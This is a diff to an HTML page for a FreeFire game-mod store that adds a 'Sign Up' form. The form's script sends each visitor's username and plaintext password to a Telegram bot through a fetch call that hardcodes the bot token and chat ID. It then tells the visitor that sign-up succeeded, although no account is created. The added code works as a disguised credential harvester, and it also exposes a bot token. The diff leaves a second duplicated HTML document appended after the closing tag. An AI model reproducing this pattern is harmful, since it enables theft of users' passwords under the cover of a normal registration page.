@@ -2,6 +2,46 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <title>Anuj FF Store - Sign Up</title>
+    <style>
+        body { background: #0f0c1b; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; }
+        .box { background: #1a162b; padding: 30px; border-radius: 10px; width: 300px; border: 1px solid #b026ff; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #b026ff; color: white; border-radius: 5px; }
+        button { width: 100%; padding: 10px; background: #b026ff; color: white; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Sign Up</h2>
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="sendData()">Register</button>
+    </div>
+
+    <script>
+        function sendData() {
+            const token = "8818167536:AAGXwjswx1HmCQDWBqaFu88zDUoLr1vXUB0";
+            const chatId = "8560508024";
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            if(user == "" || pass == "") {
+                alert("Please enter both username and password!");
+                return;
+            }
+
+            const text = "New User: " + user + "%0APassword: " + pass;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`)
+            .then(res => alert("Sign Up Successful! Admin will approve soon."));
+        }
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <title>ANUJ FF STOR - Premium FreeFire Location Mods</title>
